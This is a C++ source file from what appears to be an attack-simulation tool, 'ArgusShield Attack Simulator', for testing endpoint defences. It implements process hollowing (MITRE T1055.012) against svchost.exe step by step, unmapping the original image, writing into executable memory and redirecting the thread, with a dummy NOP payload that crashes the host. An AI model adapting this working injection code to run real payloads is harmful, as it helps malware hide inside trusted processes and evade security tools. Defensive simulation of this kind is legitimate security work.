// HollowingLogic.cpp
#include "framework.h"
#include "HollowingLogic.h"
#include "Logger.h"
#include <windows.h>
#include <winternl.h>
#include <string>
#include <sstream>

// ============================================================
// Statically linked NtDll functions (Static Building)
// ============================================================
EXTERN_C NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
);

EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(
    HANDLE ProcessHandle,
    PVOID BaseAddress
);

// ============================================================
// Process Hollowing Attack (T1055.012)
// Full 7-step implementation using real Windows APIs
// ============================================================
bool PerformProcessHollowing()
{
    HANDLE hProcess = nullptr;
    HANDLE hThread = nullptr;

    try
    {
        LogActivity("============================================");
        LogActivity("ArgusShield Attack Simulator - Process Hollowing");
        LogActivity("============================================");
        LogActivity("Technique: Process Hollowing");
        LogActivity("MITRE ATT&CK: T1055.012");
        LogActivity("");

        // Suppress Windows Error Reporting dialogs for child processes!
        // This stops the ugly "svchost.exe - Application Error" popup 
        // since our dummy payload intentionally crashes the hollowed process.
        SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX);

        // ======================================================
        // STEP 1: Create target process in SUSPENDED state
        // ======================================================
        LogActivity("[STEP 1] Creating target process in SUSPENDED state...");
        LogActivity("  -> Target: C:\\Windows\\System32\\svchost.exe");
        LogActivity("  -> Flag: CREATE_SUSPENDED");

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };

        wchar_t targetPath[] = L"C:\\Windows\\System32\\svchost.exe";

        BOOL created = CreateProcessW(
            targetPath,         // Application name
            NULL,               // Command line
            NULL,               // Process security attributes
            NULL,               // Thread security attributes
            FALSE,              // Inherit handles
            CREATE_SUSPENDED,   // Create in suspended state
            NULL,               // Environment
            NULL,               // Current directory
            &si,                // Startup info
            &pi                 // Process information
        );

        if (!created)
        {
            LogActivity("[ERROR] CreateProcessW failed. Error: " + std::to_string(GetLastError()));
            return false;
        }

        hProcess = pi.hProcess;
        hThread = pi.hThread;

        LogActivity("[SUCCESS] Process created in SUSPENDED state");
        LogActivity("  -> PID: " + std::to_string(pi.dwProcessId));
        LogActivity("  -> Thread ID: " + std::to_string(pi.dwThreadId));

        // ======================================================
        // STEP 2: Query process information (PEB + ImageBase)
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 2] Querying process information (PEB)...");

        PROCESS_BASIC_INFORMATION pbi = { 0 };
        ULONG returnLength = 0;

        // Static NT API call
        NTSTATUS status = NtQueryInformationProcess(
            hProcess,
            ProcessBasicInformation,
            &pbi,
            sizeof(pbi),
            &returnLength
        );

        if (status != 0)
        {
            std::stringstream ss;
            ss << "[ERROR] NtQueryInformationProcess failed. NTSTATUS: 0x" << std::hex << status;
            LogActivity(ss.str());
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        PVOID pebAddress = pbi.PebBaseAddress;
        PVOID imageBaseAddress = nullptr;

#ifdef _WIN64
        SIZE_T pebImageBaseOffset = 0x10;
#else
        SIZE_T pebImageBaseOffset = 0x08;
#endif

        SIZE_T bytesRead = 0;
        BOOL readResult = ReadProcessMemory(
            hProcess,
            (PBYTE)pebAddress + pebImageBaseOffset,
            &imageBaseAddress,
            sizeof(PVOID),
            &bytesRead
        );

        if (!readResult)
        {
            LogActivity("[ERROR] Failed to read ImageBaseAddress from PEB.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        {
            std::stringstream ss;
            ss << "[SUCCESS] PEB located at: 0x" << std::hex << (DWORD_PTR)pebAddress;
            LogActivity(ss.str());
        }
        {
            std::stringstream ss;
            ss << "[SUCCESS] Original ImageBase: 0x" << std::hex << (DWORD_PTR)imageBaseAddress;
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 3: Unmap the original image
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 3] Unmapping original image from target process...");

        // Static NT API call
        status = NtUnmapViewOfSection(hProcess, imageBaseAddress);
        if (status != 0)
        {
            std::stringstream ss;
            ss << "[WARNING] NtUnmapViewOfSection returned NTSTATUS: 0x" << std::hex << status;
            LogActivity(ss.str());
        }
        else
        {
            LogActivity("[SUCCESS] Original image unmapped from target process");
        }

        // ======================================================
        // STEP 4: Allocate memory for new image
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 4] Allocating memory in target process...");

        SIZE_T payloadSize = 4096; // 1 page
        LPVOID remoteBase = VirtualAllocEx(
            hProcess,
            imageBaseAddress,
            payloadSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        if (!remoteBase)
        {
            remoteBase = VirtualAllocEx(
                hProcess,
                NULL,
                payloadSize,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            );
        }

        if (!remoteBase)
        {
            LogActivity("[ERROR] VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        {
            std::stringstream ss;
            ss << "[SUCCESS] Memory allocated at: 0x" << std::hex << (DWORD_PTR)remoteBase;
            LogActivity(ss.str());
        }

        // ======================================================
        // STEP 5: Write payload
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 5] Writing payload into target process...");

        BYTE* payload = new BYTE[payloadSize];
        memset(payload, 0x90, payloadSize);
        payload[payloadSize - 1] = 0xCC;
        payload[0] = 'M';
        payload[1] = 'Z';

        SIZE_T bytesWritten = 0;
        BOOL writeResult = WriteProcessMemory(
            hProcess,
            remoteBase,
            payload,
            payloadSize,
            &bytesWritten
        );

        delete[] payload;

        if (!writeResult)
        {
            LogActivity("[ERROR] WriteProcessMemory failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        LogActivity("[SUCCESS] Payload written: " + std::to_string(bytesWritten) + " bytes");

        // ======================================================
        // STEP 6: Fix thread context
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 6] Modifying thread context (entry point redirect)...");

        CONTEXT ctx = { 0 };
        ctx.ContextFlags = CONTEXT_FULL;

        if (!GetThreadContext(hThread, &ctx))
        {
            LogActivity("[ERROR] GetThreadContext failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

#ifdef _WIN64
        ctx.Rcx = (DWORD64)remoteBase;
#else
        ctx.Eax = (DWORD)remoteBase;
#endif

        if (!SetThreadContext(hThread, &ctx))
        {
            LogActivity("[ERROR] SetThreadContext failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        SIZE_T pebBytesWritten = 0;
        WriteProcessMemory(
            hProcess,
            (PBYTE)pebAddress + pebImageBaseOffset,
            &remoteBase,
            sizeof(PVOID),
            &pebBytesWritten
        );

        LogActivity("[SUCCESS] Thread context modified, PEB updated");

        // ======================================================
        // STEP 7: Resume execution
        // ======================================================
        LogActivity("");
        LogActivity("[STEP 7] Resuming suspended thread...");

        DWORD suspendCount = ResumeThread(hThread);

        if (suspendCount == (DWORD)-1)
        {
            LogActivity("[ERROR] ResumeThread failed.");
            TerminateProcess(hProcess, 0);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return false;
        }

        LogActivity("[SUCCESS] Thread resumed.");
        LogActivity("");
        LogActivity("============================================");
        LogActivity("[COMPLETE] PROCESS HOLLOWING SUCCESSFUL!");
        LogActivity("============================================");

        // Wait briefly then terminate
        Sleep(2000);
        TerminateProcess(hProcess, 0);

        CloseHandle(hThread);
        CloseHandle(hProcess);

        return true;
    }
    catch (...)
    {
        LogActivity("[EXCEPTION] Error during process hollowing");
        if (hProcess)
        {
            TerminateProcess(hProcess, 0);
            CloseHandle(hProcess);
        }
        if (hThread) CloseHandle(hThread);
        return false;
    }
}
